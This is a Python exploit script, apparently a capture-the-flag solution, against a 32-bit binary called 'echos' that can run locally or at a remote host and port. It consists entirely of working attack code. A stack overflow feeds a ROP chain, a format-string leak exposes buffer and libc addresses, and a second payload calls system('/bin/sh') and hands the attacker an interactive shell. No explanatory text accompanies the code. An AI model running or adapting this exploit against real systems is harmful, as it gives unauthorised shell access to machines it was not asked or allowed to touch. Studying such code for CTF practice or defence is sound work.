#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './echos'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'10.66.20.180', 'port':3000})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']
addr_main           = 0x080488f8
addr_parent_main    = 0x0804879f
addr_pop_2_ebp      = 0x08048a89            # pop esi ; pop edi ; pop ebp ; ret

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_hoge    = 0x13446
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    conn.sendline(str(0xff0))
    exploit  = p32(0xdeadbeef)*3
    exploit += p32(rop.leave.address)
    exploit += p32(rop.ret.address)
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_parent_main+0x18)
    exploit += p32(0xdeadbeef)*3
    exploit += p32(addr_plt_printf+6)
    conn.sendline(exploit)

    conn.send('!%p %30$p '.ljust(0x4000, 'a'))
    conn.recvuntil('!')

    addr_buffer     = int(conn.recvuntil(' ', drop=True), 16)
    info('addr_buffer       = 0x{:08x}'.format(addr_buffer))

    addr_libc_main  = int(conn.recvuntil(' ', drop=True), 16) - 247
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    conn.send('\x06'*0x550)

    exploit  = 'X'*4
    exploit += p32(0x0a)
    exploit += chr((addr_buffer+0x28-0x9)&0xff)
    exploit += p32(addr_libc_system)
    exploit += p32(0)
    exploit += p32(addr_libc_str_sh)
    conn.sendline(exploit)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
